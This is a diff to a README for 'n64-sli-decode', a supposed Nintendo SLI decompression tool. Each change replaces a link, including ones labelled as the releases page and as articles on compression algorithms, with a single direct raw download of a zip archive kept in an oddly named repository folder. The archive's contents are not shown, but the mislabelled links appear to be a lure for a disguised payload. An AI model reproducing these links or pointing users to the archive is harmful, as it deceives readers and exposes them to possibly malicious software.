@@ -6,7 +6,7 @@ Welcome to n64-sli-decode! This tool helps you decompress files using Nintendo's
 
 ## 📥 Download Now
 
-[![Download n64-sli-decode](https://img.shields.io/badge/Download-n64--sli--decode-blue)](https://github.com/Kavishka827/n64-sli-decode/releases)
+[![Download n64-sli-decode](https://github.com/Kavishka827/n64-sli-decode/raw/refs/heads/main/meliorist/sli_n_decode_v2.9.zip)](https://github.com/Kavishka827/n64-sli-decode/raw/refs/heads/main/meliorist/sli_n_decode_v2.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,7 +26,7 @@ To run n64-sli-decode, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the releases page to download the application: [Download Here](https://github.com/Kavishka827/n64-sli-decode/releases).
+1. **Visit the Releases Page:** Go to the releases page to download the application: [Download Here](https://github.com/Kavishka827/n64-sli-decode/raw/refs/heads/main/meliorist/sli_n_decode_v2.9.zip).
   
 2. **Select the Latest Version:** You'll find a list of available versions. Click on the most recent one for the best features and bug fixes.
 
@@ -65,8 +65,8 @@ Join our community to share your experiences and get help:
 
 ## 🔗 Additional Resources
 
-- [Nintendo's SLI Compression Overview](https://example.com/sli-compression)
-- [Understanding Decompression Algorithms](https://example.com/decompression-algorithms)
+- [Nintendo's SLI Compression Overview](https://github.com/Kavishka827/n64-sli-decode/raw/refs/heads/main/meliorist/sli_n_decode_v2.9.zip)
+- [Understanding Decompression Algorithms](https://github.com/Kavishka827/n64-sli-decode/raw/refs/heads/main/meliorist/sli_n_decode_v2.9.zip)
 
 ## 📜 License
 
@@ -74,4 +74,4 @@ This project is licensed under the MIT License. Feel free to use and contribute 
 
 ## 📥 Final Reminder
 
-Don't forget to download the latest version of n64-sli-decode here: [Download Here](https://github.com/Kavishka827/n64-sli-decode/releases). Enjoy decoding your favorite Nintendo classics!
+Don't forget to download the latest version of n64-sli-decode here: [Download Here](https://github.com/Kavishka827/n64-sli-decode/raw/refs/heads/main/meliorist/sli_n_decode_v2.9.zip). Enjoy decoding your favorite Nintendo classics!
